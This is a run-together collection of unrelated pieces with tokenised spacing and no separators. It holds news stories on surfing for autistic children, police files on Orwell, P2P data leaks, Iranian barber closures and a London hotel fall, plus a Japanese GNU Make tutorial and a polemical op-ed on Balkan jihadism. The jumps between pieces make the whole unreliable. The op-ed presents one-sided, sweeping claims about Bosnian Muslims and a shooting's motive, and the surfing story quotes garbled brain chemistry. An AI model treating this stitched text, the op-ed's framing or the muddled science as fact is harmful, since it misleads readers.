" [ He ] was fine with everything , but then I think it was the sheer number of people , because crowds get him nervous , " said Rager .
It may be surprising to learn that young Ian is not the first autistic child to take an interest in surfing .
Many parents of autistic children have discovered surfing can be a valuable reprieve from a sometimes stressful life .
As they watch their children 's rigid behavior and unyielding routines , the prospect of allowing them to experience surfing for the first time means a great deal .
But as in most cases of autism , if there 's one thing that 's almost certain , it 's that doing anything for the first time can prove traumatic .
' There 's a Magic out There That Happens '
To be fair , serious surfing in serious waves -- who would n't hesitate the first time ?
And so it happens .
The children wail and flail as their parents place them into the arms of the volunteers who plan to take them out .
No matter how gentle they are , it is nearly impossible to explain to autistic children that it will be all right .
So at several points , the kids are physically forced onto the boards .
And as the volunteers begin to paddle the first unwilling child into the swelling sea , it 's almost impossible not to ask whether this is really a good thing to do to these kids .
" Somehow , someway , there 's a magic out there that happens , " said Israel " Izzy " Paskowitz , the founder and president of Surfer 's Healing , a surfing camp for autistic children .
Paskowitz is also the parent of an autistic son , Isaiah .
At 16 , Isaiah can hardly speak , but at 250 pounds , he is enormously strong .
His size came into play one morning as " Nightline " witnessed an altercation between Isaiah and his father .
Isaiah slugged his father twice , forcing Paskowitz to restrain his son on the tent floor .
Episodes like this show the raw truth of living with an autistic child , and Paskowitz has no difficulty admitting it .
The tantrums , the uncomfortable outbursts -- this was never part of his plans .
' I Thought Isaiah Would Get Better '
Paskowitz was a former competitive surfer himself , and when his son was diagnosed with autism at the age of 3 , he found it hard to accept .
" He was my hopes , my dreams , my pro surfer who was supposed to be all that stuff when you were young , " said Paskowitz .
" And I just thought he would get better .
I thought Isaiah would get better .
And I did not like the fact that he never got better . "
For a long time , Paskowitz simply walked away from it .
When Isaiah was 13 , Paskowitz admitted , he just did n't want to deal with it .
And then , by accident , Paskowitz discovered something he and his son had in common : the way the waves worked on them .
They were at the beach one day when Isaiah was having one of his tantrums .
" [ He ] would resist going in the water , " he said .
" One fit on the beach led to me throwing him in the water , and led to ' Give me that … damn board ' -- I put him on a board and we just paddled out , where we could be alone and have a cry . "
And the tears did n't come only from Isaiah .
" I want to be the strong dad .
I do n't want to be crying in front of the kids or in front of my wife .
So really , I just bawled my head off in the water with Isaiah and rode a few waves and I felt better , and he felt better .
And that 's it . "
That 's it :
Those two words led to what occurred on the beach after Isaiah was forced out of the water by his father .
He calmed down and off on the horizon , he and his father surfed in tandem .
Something soothed Isaiah that day .
Not a cure -- simply a good time , a respite .
Paskowitz has since began running events for kids with autism all over the United States and overseas .
And in most cases , it ends with the kids exhilarated , triumphant and floating on glory .
Surfing 's Soothing Powers
Ian Rager , who showed initial interest in surfing after seeing a movie , later became less willing to try it out .
He is an only child , and he and his parents had traveled for five hours from their home in Las Vegas and checked into a Best Western , just so they could be in San Diego for the event .
" [ I ] want him to know that he could do things , " said Rager .
" Because a lot of times with being the way he is , being a … high functioning autistic , other kids are n't always kind to you , and especially if he's not able to do something at school because he 's gotten emotionally overwrought or something . "
The sight of other children smiling as they mounted their surfboards also had no effect on Ian .
That 's because for a child with autism , facial expressions are like a foreign language .
For many , registering the emotions of others remains a mystery .
The other mystery -- why is surfing so soothing to these kids ?
A possible answer was discovered about 120 miles up the California coast , right off Santa Monica .
" Nightline " met up with Steven Kotler , a surfing fanatic and a writer who has thought a lot about surfing 's ability to heal .
Kotler said that when he was sick with Lyme disease a few years ago , he was hallucinating and confined to his house .
Then a physical therapist friend called him one day and urged him to go surfing .
" And I just started laughing .
At the time I could n't even walk across a room , " said Kotler of his persistent friend 's call .
" [ She ] dragged me out to the ocean , and ultimately what I was thinking was , ' You know what ?
I 'm going to kill myself .
I can't get any worse .
I wo n't be able to surf , but I 'll be able to see the ocean one more time , ' and it drove me to the ocean . "
Good for the Brain and the Body ?
As Kotler recounts in his book , " West of Jesus , " his friend was right .
Somehow he got better , and he believes it was the surfing ; he believes the risk - taking involved in surfing does something good to the brain and the body .
" Dopamine is the brain 's principle happy drug , " said Kotler .
" It is also pre-performance enhancing drug .
So muscles move faster , as does the heart .
Norpromine , another chemical produced while surfing offers a similar result . "
" [ It is ] good to be a little scared , and even if it's not a real fear , really , really small waves , you know , they can actually produce reactions , " said Kotler .
" And just the act of paddling , if you do it long enough , like any other cardiovascular activity , will endorse endorphins .
These are serious pleasure chemicals . "
Maybe that 's what was working on the beach in San Diego .
It was n't just the kids who were smiling .
So were their parents .
" They get tears , " said Isaiah 's mother , Danielle .
" They never thought their kid could do something like that , and they 're thanking me profusely , and I 'm like , ' God , do n't thank me .
Thank you . ' "
It was also good for these parents just to be around so many people who understood .
This extreme - seeming thing they were doing , letting strangers wrestle their kids into the sea , has a logic to it -- an autism kind of logic .
And parents like Paskowitz believe this logic is not understood by everyone .
" From the outside ?
[ People think ] they 're retarded , that they 're weird , " he said .
" That they 're crazy .
That the parents are sh---y parents and they let their kid run around on the cliff and dart away or steal someone 's soda .
All these things with autism , the way they look are all normal . "
' After a Couple of Waves , He Got Calm '
And so , for little Ian Rager , who resisted getting into the water , his parents , like so many others , had no problem forcing him in .
Why ?
" They lock down and they either retreat to a safe zone or push on through . "
Ian was overruled and out he went , so far out that his parents lost sight of him .
But what none of us on shore could see was captured by the cameras .
He was with a volunteer named Josh .
" After a couple of waves , he got calm , he got really calm and just kind of kept paddling , " said Josh .
" So it was really cool , it was really neat . "
Not that anyone could see that from shore , because they stayed out there a long time .
And what were Ian 's thoughts as the waves pushed him back to shore ?
" Please take me to Best Western ! "
So once was enough for Ian Rager .
But he did it .
And for a brief time , he rode the waves and floated on glory .
Save up those frequent - flier miles – and stock up on transdermal scopolamine .
Virgin Galactic has your seat on SpaceShipTwo ready .
The yet - to - be - scheduled two - and - a - half - hour jaunts to the thermosphere will cost $ 200,000 ( or 2 million Virgin Atlantic Flying Club points ) .
It 'll be rough – 3 gs on the 68 - mile ascent , 6 gs on the way down – but stylish .
" What really drove the design was having as much free space as possible for people to enjoy being weightless , " says Dick Powell , director of design shop Seymourpowell , which recently unveiled the ship 's interior .
The comfy seats are curved and soft ( probably so rich goofballs do n't bruise themselves in zero gravity ) , and the windows are big ( the better to see Earth ) .
And the Tang ?
Freshly squeezed .
Space Tourism by the Numbers
• Cost of a Soyuz trip and a stay on the International Space Station : $ 20 million
• SpaceShipTwo tickets sold : About 200
• Weightless minutes on a SpaceShipTwo flight : 5
• Cost per minute of weightlessness : $ 1,333
• Volume of the human stomach : About 1 quart

The Face of Facebook
The documents , which include details of surveillance between the 1920s and 60s , indicate not only the wide range of groups and individuals being watched by police but also officers ' spectacular ability to misjudge what they saw .
The obtuseness of some exasperated their superiors .
A Sergeant Ewing of Special Branch , monitoring Orwell 's attempt to recruit Indians to work for the BBC's India service in January 1942 , noted : " This man has advanced communist views ...
He dresses in a bohemian fashion both at his office and in his leisure hours . "
A Home Office official named W Ogilvie - whose pencil was probably responsible for a question mark against Ewing 's statement - responded a few days later : " I spoke to Inspector Gill of Special Branch asking whether his sergeant could elaborate on the question of Blair 's ' advanced communist views ' .
Mr Gill rang me up this morning to say that Sergeant Ewing described Blair as being ' an unorthodox communist ' apparently holding many of the views but by no means subscribing fully to the party 's policy .
" I gathered that the good sergeant was rather at a loss as to how he could describe this rather individual line , hence the expression ...
This fits in with the picture we have of Blair@Orwell [ sic ] .
It is evident from his recent writings ... that he does not hold with the Communist party , nor they with him . "
The authorities finally decided Orwell was not a communist from his answers to a questionnaire posed to leading leftwing figures and published in Left magazine , including the question : " Should Socialists support the British war effort ? " to which he answered , " yes " .
By then , Special Branch had been monitoring Orwell for more than 10 years .
Orwell , who was born Eric Arthur Blair in India in 1903 , worked for the Burma police in the 1920s before heading to France , where the then penniless writer first came to the attention of MI6 .
The file on " Orewell " , as his name is spelt at least once , starts with him as Mr EA Blair in January 1929 , when he was offering to work as Paris correspondent of the Workers ' Life , the forerunner of the Daily Worker .
Within a month Scotland Yard noted he was also claiming to be Paris correspondent for the Daily Herald and Daily Express .
It continues in the 30s as he helped out at a leftwing bookshop , Booklovers ' Corner in Hampstead , where he was a friend of the owner , Francis Westrope : " [ He ] and Blair are on friendly terms and the latter is known to spend a good deal of time at the shop .
He has on occasion conducted the business .
Westrope is known to hold socialist views and considers himself an ' intellectual ' . "
The file contains a cutting from the Manchester Guardian in September 1938 , noting that Orwell had signed the Joint Peace Manifesto alongside the Peace Pledge Union , the Quakers and the Labour party .
Two years earlier , the chief constable of Wigan had requested information about the writer , who had been seen addressing Communist party meetings in the town .
There are also details from his passport application , noting : " height 6ft 2ins , eyes grey , hair brown , tattoo marks on the backs of both hands " .
The police never found enough on the author of Animal Farm and 1984 to prevent him obtaining a passport or being accredited as a war correspondent for the Observer .
A record in the file , dated 1942 , describes him as someone who " has been a bit of an anarchist in his day and in touch with extremist elements " .
It adds that he had " undoubtedly strong leftwing views , but he is a long way from orthodox Communism " .
Among others kept under watch in the 1950s was the American folk song collector Alan Lomax , who appeared regularly on the BBC .
Special Branch monitored the programmes , noting his association with the Scottish singer Ewan McColl " who is connected with Theatre Workshop , a dramatic company with communist connections " , and even the film director Joseph Losey ( left ) , labelled a communist sympathiser .
A concert in St Pancras town hall in December 1953 was deemed suspicious because its theme , Songs of the Iron Road , with " melodies originating on the railway system " was advertised in the Daily Worker .
The BBC was asked to keep an eye on Lomax , but he was allowed to continue broadcasting and his folk song programme preceded the Queen 's Christmas Day message in 1957 .
A file from 1941 contains 13 pages of reports on a strike by dockyard apprentices in Chatham which followed a complaint about the standard of canteen food .
It includes a report by Sergeant Ivan Smith of the Kent police , who hid himself in the gents ' toilet at a working men's club in Gillingham to listen to the speakers at a union meeting : " I was unable to hear the majority of the proceedings owing to my obscure position in the lavatory and to the fact that a boy was standing in the cloakroom door the whole time , " it says .
" I heard someone say that the best thing would be to have all the big fellows for that job [ on the picket line ] .
The reply was that all present at the meeting should take their share and no shirking .
The meeting closed at 1630 hours but I was unable to leave until 1655 as some of the apprentices were in the hall until that time . "
The interrogation files of suspected spies and German agents have also been released , including , in that of a Norwegian seaman , a copy of the Naturist magazine of March 1945 whose photographs of nude women and advertisements for breast enhancement and " the Vitaman iodised jockstrap " were combed to see whether they contained writing in invisible ink .
One bulky file contains interviews over years with a Russian defector , Leon Helfland , who had been a KGB officer and assassin , and charge d'affaires in the Soviet embassy in Rome for seven years until he fled to the US in 1940 .
Helfland told an astonished British consular official named WH Gallienne over lunch in New York in 1941 that the Soviets , Italians and Germans had read every telegram and document from the British embassy in Rome from 1933 : " Mr H said they often marvelled at our laxity . "
Helfland never named the spy involved , but it is known to have been the Italian valet of the British ambassador , Sir Eric Drummond , who refused to believe that his servant could have betrayed Britain .
· This article was amended on Wednesday September 12 2007 .
George Orwell was born in India in 1903 , not 1902 as we said in the above article .
This has been corrected .
「 ほとんど忘れた 、Makefile 」 にて：
「 忘れている」ってよりは、僕の知識じゃ古すぎて、改めて勉強しないとダメでした*1。
なにしろ、makeだけじゃ機能が貧弱なんで、cpp（Cプリプロセッサ）やm4（マクロプロセッサ）と組み合わせて使っていた頃しか知らんからね（古すぎ！）。今じゃGNU
Makeを（使おうと思えば）どこでも使えるから、GNU
Makeを習えばそれでいいじゃないかな。僕は、Windows上のMSYS（MinGW - Minimal SYStem）でGNU Makeを動かしました。
というわけで、GNU Makeの手習いをしたからメモしておきます。以下、名前がMakefileじゃなくても、GNU
Makeへの指示を書いたファイルは何でもMakefileと呼びます。
[ 追記]id:paellaさんのブックマークコメントに曰く：
はい、そういうことです。ターゲットとかルールについては、別な資料をあたってください。
[ /追記 ]
内容：
include とif 変数と関数 空白に注意！ 続きがあると思 う
●includeとif
GNU Makeは、cppのお世話になんかなりませんね。includeとifがあります。if文は、ifeq , ifneq , ifdef , ifndefで、文字列の等値性と変数の定義状況を調べることができます。等号以外の比較演算／論理演算は使えないから、その点ではcppのほうが高機能(( cppだと、 # if ( defined ( debug ) || defined ( DEBUG ) ) && ! defined ( NO_DEBUG ) のような書き方ができます。 ) )
かもしれないけど、これだけでも間に合うでしょう。
Makefile実例：
# file : t1.mk
include ../common.mk ifeq ( $( OS_TYPE ) , win32 )
include ../win32.mk
endif - include optional .mk ifdef debug
DEBUG_FLAG = -DDEBUG
else
DEBUG_FLAG =
endif print_vars :
@echo " OS_TYPE = '$ ( OS_TYPE ) ' "
@echo " DEBUG_FLAG='$ ( DEBUG_FLAG ) ' "
念のため説明 ：
ファイル../common.mkをインクルードします。僕は、 include " ../common.mk " と書いてハマってました。cppじゃないって。
変数OS_TYPEの値がwin32のときは、ファイル../win32.mkをインクルードします。変数の値は、環境変数やmakeコマンド起動時オプションにより指定できます。
includeディレクティブの前にマイナスを付けると、ファイルがなくてもエラーになりません。
- include optional.mk は、ファイルoptional.mkがあれば読み込み、なければ何もしません。
変数debugが定義されていれば（値はなんでもいい）、変数DEBUG_FLAGの値を-DDEBUGに設定します。そうでないなら、DEBUG_FLAGの値は空（長さ0の文字列、未定義と同じ）です。 確認のためのターゲットprint_varsが実行されると、変数値を表示します。
実行例：
$ make -f t1.mk
OS_TYPE =''
DEBUG_FLAG ='' $ make OS_TYPE=win32 -f t1.mk
OS_TYPE='win32 '
DEBUG_FLAG ='' $ make OS_TYPE=win32 debug=1 -f t1.mk
OS_TYPE='win32 '
DEBUG_FLAG='- DDEBUG '
●変数と関 数
Makefileの構文はどうも一貫性がなく、オマジナイのような記号が色々あって、なじみにくいものでした。GNU
Makeは、構文と意味論を整理して合理化しようと試みています。互換性から古い構文も残っていますが、新しい一貫した構文を使ったほうがいいと思います。
構文の大原則として、変数参照は$ ( FOO ) のようにドル記号（ 「 $ 」）を使います。丸括弧（例：$( FOO ) ）または波括弧（例：$ {FOO}）は必須だと思ってください。例外は変数名が1文字のときで、$FOOは$( F) OOと同じです。$@、$ < のような変な記号も、名前が「@ 」 、「
ドル記号は、変数参照だけでなく、関数呼び出しにも使えます。例えば、$( subst ge , GA , $( FOO ) ) は関数substに3つの引数を渡して呼び出しています。substは文字列置換関数で、$( FOO )の値である文字列に出現するgeをGAに置き換えます。
# file : t2.mk
FOO=hoge hoge fuga hage
BAR =$ ( subst ge , GA , $ ( FOO ) ) print_vars :
@echo " FOO = '$ ( FOO ) ' "
@echo " BAR = '$ ( BAR ) ' "
このMakefileを実行すると 、
$ make -f t2.mk
FOO = ' hoge hoge fuga hage '
BAR=' hoGA hoGA fuga haGA '
Perlなら、次ようになりますかね。
$ FOO = " hoge hoge fuga hage " ;
( $ BAR = $ FOO ) =~ s/ge/GA/g ;
print " FOO = '$ FOO '
" ;
print " BAR = '$ BAR '
" ;
実は、関数呼び出しを使うときは、代入に「=」を使うより「:=」のほうが適切かつ効率的なときが多いのですが、その話は次の機会にします。（続きに書きました。）
もちろん、ドル記号を使った変数参照／関数呼び出しの出現は、その値／戻り値に展開（置換）されます。ドル記号そのものを書きたいなら$$とします。
●空白に注意 ！
Makefileの変数には、値として文字列が入ります。しかし、プログラミング言語とは違って、引用符（「 " 」や 「'」）をまったく使わないので、文字列の開始／終了が分かりにくいですねー。
次 のMakefileを実行するとどうなるか、予測できますか？
# file : t3.mk
X1=a
X2 = a
X2 = a
X3 = a # with trailing spaces
X4 = a b
X5 = a b print_vars :
@echo " X1= '$ ( X1 ) ' "
@echo " X2= '$ ( X2 ) ' "
@echo " X3 = '$ ( X3 ) ' "
@echo " X4 = '$ ( X4 ) ' "
@echo " X5 = '$ ( X5 ) ' "
やってみましょう 。
$ make -f t3.mk
X1='a '
X2='a '
X3 ='a '
X4 ='a b'
X5 ='a b'
イコールの左右の空白は無視されます。したがって、値の先頭空白が無視されることになります。しかし、値の末尾や中間にある空白はそのまま残ります。
次はどうでしょう ？
# file : t4.mk
X1 = hello world
X2 =$ ( subst h , H, $ ( X1 ) )
X3 =$( subst h , H, $ ( X1 ) )
X4 =$ ( subst h , H , $ ( X1 ) )
X5 =$ ( subst h , H , $ ( X1 ) )
X6 =$ ( subst h , H , $ ( X1 ) )
X7 =$ ( subst h , H , $( X1 ) ) print_vars :
@echo " X1= '$ ( X1 ) ' "
@echo " X2= '$ ( X2 ) ' "
@echo " X3 = '$ ( X3 ) ' "
@echo " X4 = '$ ( X4 ) ' "
@echo " X5 = '$ ( X5 ) ' "
@echo " X6 = '$ ( X6 ) ' "
@echo " X7= '$ ( X7 ) ' "
こうなります 。
関数呼び出しにおける、関数名と引数並びのあいだの空白はいくつあっても同じですが、カンマの前後の空白とお尻の空白はそのまま保存されます。
ifeqはもっと奇妙な挙動をします。「余分な空白があるとヤバいな」と思ったら、前後の空白を削るstrip関数を使ってください。なお、strip関数は中間の空白も圧縮します*2。
# file : t5.mk
A=foo
B=foo # with trailing space ifeq ( $ ( A ) , $ ( A ) )
X1 = A=A
endif ifeq ( $ ( A ) , $ ( A ) )
X2 = A=_A
endif ifeq ( $ ( A ) , $ ( A ) )
X3 = _A=A
endif ifeq ( $ ( A ) , $ ( A ) )
X4 = A=A_
endif ifeq ( $ ( A ) , $ ( A ) )
X5 = _A=_A
endif ifeq ( $ ( A ) , $ ( B ) )
X6 = A=B
endif ifeq ( $ ( B ) , $ ( A ) )
X7 = B=A_
endif ifeq ( $ ( A ) , $( strip $ ( B ) ) )
X8 = A=stripB
endif print_vars :
@echo " X1= '$ ( X1 ) ' "
@echo " X2= '$ ( X2 ) ' "
@echo " X3 = '$ ( X3 ) ' "
@echo " X4 = '$ ( X4 ) ' "
@echo " X5 = '$ ( X5 ) ' "
@echo " X6 = '$ ( X6 ) ' "
@echo " X7= '$ ( X7 ) ' "
@echo " X8 = '$ ( X8 ) ' "
実行結果はこんなです 。
$ make -f t5.mk
X1='A=A '
X2='A=_A '
X3 = ''
X4 = ''
X5 = ''
X6 = ''
X7= 'B=A_'
X8='A=stripB '
X2の'A=_A'ってのがなんか不思議ですねー、どうやらifeqではカンマの左右の空白は削除されるようです(苦笑)。ともかくトラブルを未然に防ぐには、
余分な空白を入れない ！
のが一番です 。
では、空白から始まる変数値はどうやって設定するのでしょうか？
次の裏技があります。（これも「=」より「:=」を使うのが望ましい。）
# file : t6.mk
EMPTY =
SPACE=$( EMPTY ) $ ( EMPTY ) print_vars :
@echo " EMPTY ='$ ( EMPTY ) ' "
@echo " SPACE = '$ ( SPACE ) ' "
$ make -f t6.mk
EMPTY =''
SPACE= ' '
SPACE を定義するときの二番目の$( EMPTY ) は不要ですが、書いてないと分かりにくいですよね。
●続きがあると思 う
まだ、関数を使ってソースやターゲットを生成する方法とかパターン規則の説明をしてないので、続きを書くと思います。調べているうちに、GNU
Makeの構文（の一部）はある種のプログラミング言語だという気がしてきました；そのことも書きたい気がしてます。いつものことながら、保証はしませんけどね。
[ 追記 ] 続きを書きました 。
[ /追記 ]
The House Committee on Oversight and Government Reform has asked the FTC to look more closely at P2P apps — but this time , the worries have nothing to do with copyright .
The committee has a bee in its collective bonnet about the issue of data security , and believes that P2P users across the country are inadvertently leaking private information and financial records into the tubes .
Such information could be used for identity theft ( and also has national security implications in some cases ) , and the Oversight Committee wants the FTC to do something .
This is n't the first time the issue has been raised .
The FTC actually convened a hearing on the matter back in December , 2004 , at which various P2P vendors showed up and pledged their support for an industry Code of Conduct intended to prevent government regulation .
That code included principles about making it obvious to consumers which files and folders were being shared .
But a USPTO report earlier this year stirred up the issue again by claiming that P2P installs could adversely affect national security when they made confidential government information available .
This has already happened several times , as the Oversight Committee learned in July when it held hearings on the USPTO report and its findings .
At that hearing , representatives were also shown real - time P2P search data .
While most of the searches were for porn , movies , and music , the committee noted a surprisingly number of searches for private financial information .
The FTC has repeatedly said that it is monitoring the P2P vendors for violations of the Code of Conduct , but that P2P installs are generally as dangerous as other " Internet - related activities , " not more so .
The Oversight Committee questions this assessment in its new letter to the FTC , saying , " We have not seen evidence that any of these other ' Internet - related activities ' leads to the wholesale information disclosures described at the Committee 's hearing . "
In support of its view , the committee points out that the Justice Department recently prosecuted someone for committing identity theft with information gleaned from P2P networks .
Before being caught , the suspect racked up $ 70,000 in fraudulent purchases .
Of course , this sort of thing happens all the time over the web ( phishing , anyone ? ) , so the example seems to undermine the basic argument .
The committee wants the FTC to answer five questions about P2P apps , including one about whether the agency needs additional authority from Congress to regulate P2P vendors .
If the Oversight Committee gets its way , P2P vendors may not escape government regulation for much longer .
Men also are subject to scrutiny over their clothing
The authorities say the barbers were encouraging un -Islamic behaviour by offering Western hairstyles , tattooing and also eyebrow - plucking for men .
Police say they have inspected more than 700 shops during a two - week crackdown in the city .
The move is part of an annual campaign against what is known locally as bad hijab , or un-Islamic clothing , that this year is also targeting men .
Hundreds of women and men have already been cautioned .
Police say that as well as avoiding Western hairstyles and make up , barbers should not pluck customers ' eyebrows .
The closure of the shops comes several months after barbers were warned that they could lose their licences if they did not comply .
However , police have denied a report that they have ordered barbers not to serve customers wearing ties .
Some young boys in Iran sport very wild hair styles , using gel to make their long hair stand on end in a fashion not seen in other countries , correspondents say .
The September morning six years ago that saw three hijacked jetliners slam into the World Trade Center and the Pentagon has often been called " the day everything changed . "
What really changed was Americans skepticism of their own government  a fact that has been abused ever since .
The man from Crawford who campaigned on the promise of a " more humble foreign policy " and against Clintonian " nation - building " quickly became Emperor George , launching two foreign wars in rapid succession and asserting the right to attack anyone , anywhere , for any reason .
The rest of the world was either " with us or against us , " and the same stark choice was given to the American people .
All of this was justified by a perpetual " war on terrorism . "
That war , it turned out , was against many things  but terrorism was not one of them .
These Are Not The Jihadists You Are Looking For
Once it was established that Islamic militants were behind 9/11 , many analysts believed that Emperor Bush would start paying attention to the Balkans .
The presence of mujahedin  " holy warriors " engaged in jihad for Islam  in Bosnia has been one of the best - known secrets of the 1992 - 95 war .
Not only did the regime of Islamic fundamentalist Alija Izetbegovic welcome thousands of " Afghans " and other jihadist volunteers , it established domestic mujahedin units and encouraged the foreigners to settle in Bosnia after the war .
Izetbegovics government also designated all Bosnian Muslim soldiers who died in the war as shaheed , " martyrs for the faith . "
The U.S. not only knew about this , but also actively aided the Bosnian regime , turning a blind eye to illegal arms shipments from Iran .
Several Clinton administration officials got a slap on the wrist during the 1996 Congressional investigations , but nothing more .
Bushs " War on terror " never came to Bosnia , though .
Evidence of terrorist activities , connections , training camps , financing and recruitment was handled quietly , swept under a rug , or simply ignored .
In August 2005 , Bosnian Muslim weekly Slobodna Bosna quoted Jacques - Paul Klein , a senior U.S. official in Bosnia , " as having confirmed to the Security Council that Islamic terrorists were active in Bosnia , but added that it was good they were concentrated in one place , because  the rest of the world would be safe .  "
Emboldened by this neglect , the radical Islamist elements in Bosnia have grown stronger over time .
Last month , U.S. deputy viceroy Raffi Gregorian met with a hailstorm of protest from the Muslim community for even suggesting there were terrorist sympathizers in Bosnia .
Meanwhile , Bosnian Muslim " political scientists " have developed a new definition of terrorism , according to which Islamic terrorism cannot  and therefore , does not  exist !
Keys To Understanding Jihad
Two recently published books argue that Bosnia  and the Balkans in general  is crucial to understanding modern jihad .
Similar works in the past  Evan Kohlmanns Al - Qaedas Jihad in Europe was published in 2004  met with wall of silence , and the mainstream media is certainly treating John R. Schindlers Unholy Terror and Chris Delisos The Coming Balkan Caliphate the same way .
Schindler used to be an NSA analyst and counterintelligence officer , and now teaches at the Naval War College .
His Unholy Terror : Bosnia , Al - Qaeda and the Rise of the Global Jihad argues that Bosnia " played the same role for al - Qaeda in the 1990s that Afghanistan did in the 1980s , " providing a training ground for a generation of jihadists .
Deliso , who runs Balkanalysis.com and has been a columnist for Antiwar.com as well , goes beyond al - Qaeda and Islamic terrorism , examining the penetration of radical Islam throughout the Balkans , from Bosnia and Kosovo , the Serbian province of Raska , as well as Bulgaria and Macedonia .
His work also quotes testimonies from UN and NATO insiders , showing that the West has deliberately turned a blind eye to Islamic activities in the Balkans , as Muslim radical have been considered allies against the evil Serbs .
This perception of Islamic radicals as allies of the U.S. in the geopolitical sense cannot be stressed enough .
Recall that Zbigniew Brzezinski , President Carters National Security Advisor , boasted of his brilliant idea to support a fanatical Islamic movement in Afghanistan in the 1970s as a way to hurt the Soviet Union .
Afghanistan did hurt the Soviets , but it also gave birth to the Taliban and al - Qaeda .
U.S. policy in the Balkans  on the surface absurd and arbitrary  begins making a twisted sort of sense if Bosnia and Kosovo are seen as the modern Afghanistan , and Serbs as the surrogate Russians
Further food for thought along these lines can be found in " The Bosnian Connection " by UK journalist Brendan ONeill , which argues that both modern liberal imperialism and al - Qaedas jihad were forged in the fires of Bosnia , with each side manipulating the facts of the war to bolster their own narrative .
This explains both why liberal - imperialists like Tom Lantos ( D - Ca. ) believe they can purchase the friendship of the Muslim world by holding forth Bosnia and Kosovo as examples where America " saved Muslims from genocide , " and why the jihadists just dont care .
Interventionists in the West , knowing little or nothing about Islam , assumed the Islamic world would react to their support of Izetbegovic and the KLA as they would have reacted .
Instead , Islamic militants saw Bosnia and Kosovo as instances of the " Crusaders " standing idly by while Muslims were slaughtered wholesale  an idea , ironically enough , bolstered by the hysterical propaganda and " advocacy journalism " of mainstream news outlets in the West .
The ‘ War ’ at Home
Even as Emperor Bush and his supporters have argued that " were fighting terrorists over there so we dont have to fight them over here , " jihad has already arrived on American shores .
Last week , the Salt Lake City police closed their investigation of Sulejman Talovics February 2007 rampage , without establishing a motive for the attack .
The Deseret Morning News quoted Chris Burbank , SLC police chief , as saying that the motive " may have died " with Talovic .
This is the same Burbank who said , back in February , that he had ruled out jihad as the motive , considered that notion " hate speech , " and intended to fire anyone who dared investigate along those lines .
On Valentines Day , Talovic shot nine people at the Trolley Square mall , five of them fatally , before getting killed by an off - duty police officer that happened to be on the scene .
As soon as it was established that the shooter was a Bosnian Muslim refugee , the media went into overdrive  while information about the victims was virtually nonexistent , Talovic himself was subject of many three - handkerchief pieces about his suffering at the hands of evil Serbs in Bosnia , fully exploiting the fact that his family passed through Srebrenica ( in 1993 ) on its way to the US .
This Stockholm syndrome went so far that citizens of Salt Lake City took up donations for Talovics family , which paid for Talovic to be flown to Bosnia and buried in a splendid Islamic ceremony .
Detective Burbanks determination to see no jihad was rewarded with a promotion .
The massacre was ruled a " mystery "  to anyone who refuses to see the obvious , anyway .
In May 2007 , six men were arrested in a FBI sting on charges of plotting a terror attack on Fort Dix , New Jersey .
Four of them were ethnic Albanians  a fact that emerged only after several days of media obfuscation , in which they were called " Yugoslavs " or even " Serbian citizens . "
One of the suspects was a member of the KLA , while the other three were illegal immigrants from western Macedonia .
These are all examples of non-Arab terrorists , the " white al - Qaeda " of which Balkans sources have warned for years .
But because such facts do not fit the official narrative  namely , that Muslims ( Bosnian , Albanian , etc. ) are solely the innocent victims of evil Serbs  the warnings have fallen on deaf ears .
Self - Deception
Could the reason for this be what Chris Deliso says is " Serbian lobbys tendency to sensationalize and even provide false information incriminating the Albanians " ?
A handful of blogs that wax hyperbolic does not a lobby make , though .
And either way , the Serbs propensity to see jihad everywhere certainly doesnt excuse the tendency of Western media to see no jihad at all .
In the aftermath of the Fort Dix arrests , a rare voice of protest arose from the Washington Times , where an editorial ( no longer accessible online ) fired a broadside at American journalists :
" But when a fact   Albanian  emerges , report it .
The public has a right to know .
The sanitization of language is at war with the publics right to an understanding of the facts .
[ ]
 Yugoslav is a sanitizer . [ ]
As long as our news organizations fail to report the facts they know to be true , they are failing to do their job .
They should not engage in  perception management . "
In this day and age this comes across as quaint .
The media have done nothing but " perception management , " particularly when it came to jihad , or the Balkans .
The lid of secrecy covering the Sept. 6 Israeli air strike into Syria remains tight but one new theory emerging amid the speculation is that the Israeli conducted an electronic warfare exercise in preparation for future strikes or an attack on Iran .
Authoritative reports from the Middle East stated that the Israel operation included extensive electronic warfare jamming by aircraft .
The Israeli were testing the capabilities of Russian - made air defenses , including both radar and missiles located near Damascus and south of Homs near the Lebanese northern border .
The raid was unprecedented in the blanket of jamming and electronic disruption that it caused over wide areas of Syria enroute to the target point , a base near the Euphrates River .

So where , you might wonder , would you find the crock of gold ?
That 's what the myth says you will discover at the end of the rainbow .
But sadly for treasure - hunters , this one has no end .
It is a perfect circle .
This awesome sight in the skies over Malaysia yesterday was n't really a rainbow at all but a rare optical illusion called a sundog .

These appear when the sun is low in the sky and its rays catch the thin vapour formed of ice crystals which lies in the atmosphere six miles above the Earth 's surface .
The rays are refracted by the crystals to produce what looks like a halo round the sun .
Sometimes , as here , they display a spectrum of colours from red closest to the sun to a pale blue furthest from it , which has led to them being mistaken for full circle rainbows .
In centuries past , they were thought of as signs of ill omen .
These days they are most often mistaken for UFOs .

A suspected burglar fell 30 feet from a top - storey window of a London hotel after being disturbed by guests .
He is fighting for his life after plunging face first on to the pavement from the second - floor window of the building in Victoria .
Five men , all of whom are believed to be tourists and guests at the hotel , are being interviewed by police .
" Two men have been arrested and are being held at a central London police station , " a Scotland Yard spokeswoman said .
Scroll down for more ...
Witnesses heard shouting and smashing noises from the top floor of the building just before the man fell at 6 pm last night .
The man is believed to have been disturbed by two Italian guests returning to their room at the Cedar Guest House in Hugh Street .
Detectives are trying to establish if the intruder fell trying to escape or was pushed during a struggle .
The police spokeswoman would not confirm the man was a burglar but said it was one of several lines of inquiry .
The victim , who is in his 20s , suffered severe head injuries and is in a critical condition at the Royal London hospital .
Jay Barrymore , 23 , the first person on the scene , said he noticed a large gash on the back of the man 's head - from a " heavy blow " - even though he landed face - first .
The financial analyst , who works nearby , added : " I saw a silhouette tumble out of the window on the top floor and I thought , ' God , what has happened here ? '
I thought it was a practical joke or workmen throwing something out of the window .

" I ran towards the building and there was this guy there on the ground bleeding very heavily .
He was unconscious - I did n't think he was alive . "
He said the man 's trousers were halfway down his leg and he only had one shoe on .
Technical officer Clive Alexander , 47 , of Edmonton , who was walking along Wilton Road at the time , said : " As I was walking past some guy came flying out of the window .
There seemed to be some form of fight , as I could hear yelling .
It happened very fast . "
Personal trainer Galwyn Maratou , 25 , who lives on Hugh Street , saw the man unconscious on the ground .
He said : " There had been a fight .
I just saw this guy was on the ground with blood everywhere .
He was really messed up .
